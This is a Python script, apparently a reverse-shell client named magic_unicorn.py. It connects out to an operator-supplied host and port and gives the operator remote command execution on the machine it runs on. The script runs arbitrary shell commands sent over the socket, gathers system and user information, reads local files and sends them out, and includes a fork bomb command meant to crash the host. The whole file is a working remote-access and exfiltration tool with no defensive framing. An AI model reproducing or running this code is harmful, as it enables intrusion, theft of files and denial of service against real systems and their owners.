#!/usr/bin/env python3

import socket
import subprocess
import os
import sys
import platform
import getpass
import colorama
from colorama import Fore, Style
from time import sleep

colorama.init()

I = '\033[1;77m[i] \033[0m'
Q = '\033[1;77m[?] \033[0m'
S = '\033[1;32m[+] \033[0m'
W = '\033[1;33m[!] \033[0m'
E = '\033[1;31m[-] \033[0m'
G = '\033[1;34m[*] \033[0m'

if len(sys.argv) < 3:
    print("Usage: magic_unicorn.py <remote_host> <remote_port>")
    sys.exit()

RHOST = sys.argv[1]
RPORT = int(sys.argv[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))

while True:
    try:
        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode("utf-8")

        if cmd == "list":
            sock.send(str(os.listdir(".")).encode())

        if cmd == "forkbomb":
            while True:
                os.fork()

        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
            sock.send(I+"Changed directory to {}.".format(os.getcwd()).encode())

        elif cmd == "sysinfo":
            sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """
            sock.send(sysinfo.encode())

        elif cmd.split(" ")[0] == "download":
            print(G+"")
            with open(cmd.split(" ")[1], "rb") as f:
                file_data = f.read(1024)
                while file_data:
                    print("Sending", file_data)
                    sock.send(file_data)
                    file_data = f.read(1024)
                sleep(2)
                sock.send(b"DONE")
            print(S+"File successfully downloaded!")

        elif cmd == "exit":
            sock.send(b"exit")
            break

        else:
            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate()
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)

        if not cmd:
            break
    except Exception as e:
        sock.send("An error has occured: {}".format(str(e)).encode())
sock.close()
